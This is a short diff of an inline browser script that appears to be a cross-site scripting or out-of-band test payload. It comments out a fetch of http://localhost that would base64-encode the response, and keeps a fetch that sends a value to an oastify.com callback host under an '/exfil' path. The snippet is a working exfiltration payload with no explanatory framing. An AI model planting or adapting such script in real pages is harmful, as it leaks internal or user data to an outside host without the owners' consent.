@@ -5,11 +5,11 @@
 (async () => {
 
 var encoded = "test";
-const res = await window.fetch("http://localhost");
-const text = await res.text();
-if (text) {
-    encoded = btoa(text);
-}
+// const res = await window.fetch("http://localhost");
+// const text = await res.text();
+// if (text) {
+//     encoded = btoa(text);
+// }
 await window.fetch(`https://srnh98gs9hz3iu6f89vcmng5ewkn8mwb.oastify.com/exfil?d=${encoded}`);
 })();
 </script>
